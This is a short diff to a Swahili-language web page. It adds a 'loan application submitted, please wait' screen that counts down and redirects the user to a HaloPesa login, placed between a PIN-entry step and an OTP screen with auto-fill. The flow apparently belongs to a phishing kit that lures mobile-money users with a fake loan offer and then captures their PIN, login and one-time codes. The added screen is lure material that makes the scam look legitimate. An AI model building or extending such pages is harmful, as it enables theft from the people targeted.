@@ -163,6 +163,24 @@
       <button id="btn-submit-pin" class="primary-btn" disabled>INGIA</button>
     </section>
 
+    <!-- Step 5b: Waiting / Approval Pending Screen -->
+    <section id="step-waiting" class="card hidden text-center waiting-card">
+      <div class="waiting-icon-container">
+        <div class="waiting-clipboard-icon">📋</div>
+      </div>
+      <h2>Maombi ya Mkopo Yamewasilishwa</h2>
+      <p class="subtitle-waiting">
+        Maombi yako ya mkopo yamewasilishwa. Tafadhali subiri idhini.<br>
+        Utapata ujumbe wa uthibitisho. Kwa sasa, endelea kwenye HaloPesa.
+      </p>
+
+      <div class="waiting-badge">
+        <span>🔄 Unaelekezwa kwenye kuingia HaloPesa katika <strong id="waiting-countdown">3</strong> s...</span>
+      </div>
+
+      <button id="btn-go-login-now" class="primary-btn waiting-btn">Nenda Kuingia Sasa</button>
+    </section>
+
     <!-- Step 6: OTP Screen with Countdown & Auto-Fill -->
     <section id="step-otp" class="card hidden">
       <h2>Uthibitisho wa OTP</h2>
@@ -215,5 +233,5 @@
 
   <script src="script.js"></script>
 </body>
-          </html>
-  
+        </html>
+            
